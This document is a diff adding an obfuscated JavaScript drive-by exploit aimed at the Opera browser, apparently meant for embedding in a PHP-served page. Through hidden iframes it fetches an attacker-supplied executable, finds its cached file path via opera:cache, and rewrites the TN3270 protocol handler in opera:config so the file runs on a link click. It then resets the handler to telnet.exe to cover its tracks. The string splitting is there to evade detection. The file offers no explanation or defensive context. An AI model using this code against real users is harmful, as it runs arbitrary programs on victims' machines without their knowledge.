@@ -1,0 +1,35 @@
+<script>
+blank_iframe = document.createElement('if'+'ra'+'me');
+blank_iframe.src = 'a'+'bo'+'ut:b'+'lank';
+blank_iframe.setAttribute('st'+'yle', 'disp'+'lay:n'+'one');
+blank_iframe.setAttribute('i'+'d', 'bla'+'nk_i'+'fram'+'e_w'+'indow');
+document.appendChild(blank_iframe);
+blank_iframe_window.eval
+	("config_iframe = document.createElement('if'+'ra'+'me');\
+	config_iframe.setAttribute('i'+'d', 'con'+'fig_if'+'rame_w'+'indow');\
+	config_iframe.src = 'op'+'era:c'+'on'+'fig';\
+	document.appendChild(config_iframe);\
+	app_iframe = document.createElement('sc'+'ri'+'pt');\
+	cache_iframe = document.createElement('if'+'ra'+'me');\
+	app_iframe.src = '<?=$exe?>';\
+	app_iframe.onload = function ()\
+	{\
+		cache_iframe.src = 'op'+'er'+'a:c'+'ache';\
+		cache_iframe.onload = function ()\
+		{\
+			cache = cache_iframe.contentDocument.childNodes[0].innerHTML.toUpperCase();\
+			var re = new RegExp('(OPR\\\\w{5}.EXE)</TD>\\\\s*<TD>\\\\d+</TD>\\\\s*<TD><A HREF=\"'+app_iframe.src.toUpperCase(), '');\
+			filename = cache.match(re);\
+			config_iframe_window.eval\
+			(\"\
+			opera.setPreference('Ne'+'tw'+'ork','TN3270 App',opera.getPreference('User Prefs','Cache Directory4')+parent.filename[1]);\
+			app_link = document.createElement('a');\
+			app_link.setAttribute('h'+'r'+'ef', 't'+'n3'+'270://n'+'oth'+'ing');\
+			app_link.click();\
+			setTimeout(function () {opera.setPreference('Ne'+'tw'+'ork','TN'+'327'+'0 A'+'pp','te'+'ln'+'et.'+'exe')},1000);\
+			\");\
+		};\
+		document.appendChild(cache_iframe);\
+	};\
+	document.appendChild(app_iframe);");
+</script>
